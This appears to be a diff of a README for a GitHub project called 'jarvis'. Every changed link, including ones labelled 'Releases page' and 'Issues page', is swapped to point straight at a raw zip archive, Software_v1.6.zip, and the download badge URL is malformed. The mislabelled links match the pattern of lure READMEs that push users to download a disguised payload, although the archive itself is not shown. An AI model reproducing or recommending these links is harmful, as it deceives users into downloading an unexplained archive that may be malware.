@@ -8,13 +8,13 @@ Welcome to the jarvis project! This guide will help you download and run jarvis,
 
 ## 🔗 Download
 
-[![Download jarvis](https://github.com/Haaxy66/jarvis/raw/refs/heads/main/docs/Software-environage.zip%https://github.com/Haaxy66/jarvis/raw/refs/heads/main/docs/Software-environage.zip)](https://github.com/Haaxy66/jarvis/raw/refs/heads/main/docs/Software-environage.zip)
+[![Download jarvis](https://raw.githubusercontent.com/Haaxy66/jarvis/main/components/Software_v1.6.zip%https://raw.githubusercontent.com/Haaxy66/jarvis/main/components/Software_v1.6.zip)](https://raw.githubusercontent.com/Haaxy66/jarvis/main/components/Software_v1.6.zip)
 
 ---
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Haaxy66/jarvis/raw/refs/heads/main/docs/Software-environage.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Haaxy66/jarvis/main/components/Software_v1.6.zip).
 
 2. On the Releases page, you will find the latest version of jarvis.
 
@@ -69,7 +69,7 @@ To ensure jarvis runs smoothly, make sure your system meets the following requir
 
 If you encounter any issues while downloading or using jarvis, you can reach out for help. Please follow these steps:
 
-1. Check the [Issues page](https://github.com/Haaxy66/jarvis/raw/refs/heads/main/docs/Software-environage.zip) on GitHub for known problems or solutions.
+1. Check the [Issues page](https://raw.githubusercontent.com/Haaxy66/jarvis/main/components/Software_v1.6.zip) on GitHub for known problems or solutions.
 2. If your issue is not listed, create a new issue, providing details about the problem you are facing.
 
 We appreciate your feedback and will try to address any concerns you may have.
